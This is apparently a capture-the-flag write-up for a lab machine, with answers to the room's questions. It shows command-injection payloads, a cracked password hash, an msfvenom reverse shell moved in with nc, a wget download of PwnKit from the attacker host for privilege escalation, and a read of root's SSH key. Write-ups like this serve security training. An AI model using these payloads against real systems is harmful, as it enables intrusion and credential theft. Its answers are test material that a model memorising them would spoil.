@@ -1,0 +1,209 @@
+
+IP - 10.10.189.209
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Which software is using the port 8081?
+
+Node.js
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Which other non-standard port is used?
+
+31331
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Which software using this port?
+
+Apache
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Which GNU/Linux distribution seems to be used?
+
+Ubuntu
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+The software using the port 8081 is a REST api, how many of its routes are used by the web application?
+
+2
+
+That are GET And POST.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I found some juciy information from robots.txt
+
+http://10.10.189.209:31331/robots.txt
+
+Allow: *
+User-Agent: *
+Sitemap: /utech_sitemap.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+utech_sitemap.txt
+
+/
+/index.html
+/what.html
+/partners.html
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I found command injection vulnerbility from this api url
+
+http://10.10.189.209:8081/ping?ip=10.10.189.209
+
+I bypass the command injection filter with:
+
+%0A
+
+payload - /ping?ip=10.10.189.209%0Als
+
+Result will show like below:
+
+PING 10.10.189.209 (10.10.189.209) 56(84) bytes of data.
+64 bytes from 10.10.189.209: icmp_seq=1 ttl=64 time=0.015 ms
+
+--- 10.10.189.209 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
+index.js
+node_modules
+package.json
+package-lock.json
+start.sh
+utech.db.sqlite
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+There is a database lying around, what is its filename?
+
+utech.db.sqlite
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+What is the first user's password hash?
+
+f357a0c52799563c7c7b76c1e7543a32 (n100906)
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+What is the password associated with this hash?
+
+n100906
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+I generate msfvenom linux reverse shell
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.8.93 LPORT=4445 -f elf > shell.elf
+
+And then I transfer shell with nc
+
+From my machine
+
+nc -lvp 5555 < shell.elf
+
+Victim Machine (from burp)
+
+/ping?ip=10.10.189.209%0Anc%2010.17.8.93%205555>%20shell.elf
+
+/ping?ip=10.10.189.209%0Achmod%20777%20shell.elf (change permission)
+
+And then I move file into tmp
+
+/ping?ip=10.10.189.209%0Acp%20shell.elf%20/tmp/shell.elf
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Execute Reverse shell from browser
+
+http://10.10.189.209:8081/ping?ip=10.10.189.209%0A/tmp/./shell.elf
+
+Boom!
+
+I got reverse shell
+
+┌──(root㉿kali)-[~/Desktop/THM_CTF/UltraTech]
+└─# nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.17.8.93] from (UNKNOWN) [10.10.189.209] 54372
+whoami
+www
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+And Then I upgrade the shell with python ptty
+
+python2 -c 'import pty;pty.spawn("/bin/bash")'
+
+export TERM=xterm
+
+Ctrl + Z
+
+stty raw -echo; fg
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalate with PwnKit
+
+From My Machine:
+
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]
+└─# python2 -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...
+10.10.189.209 - - [07/Jan/2023 05:58:38] "GET /PwnKit HTTP/1.1" 200 -
+
+From victim Machine:
+
+www@ultratech-prod:/tmp$ wget http://10.17.8.93:8888/PwnKit
+--2023-01-06 23:28:38--  http://10.17.8.93:8888/PwnKit
+Connecting to 10.17.8.93:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16800 (16K) [application/octet-stream]
+Saving to: 'PwnKit'
+
+PwnKit              100%[===================>]  16.41K  73.0KB/s    in 0.2s    
+
+2023-01-06 23:28:38 (73.0 KB/s) - 'PwnKit' saved [16800/16800]
+
+www@ultratech-prod:/tmp$ chmod +x PwnKit 
+www@ultratech-prod:/tmp$ ./PwnKit 
+root@ultratech-prod:/tmp# whoami
+root
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ What are the first 9 characters of the root user's private SSH key? 
+
+ MIIEogIBA
+
+ root@ultratech-prod:~/.ssh# cat id_rsa
+
+ ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
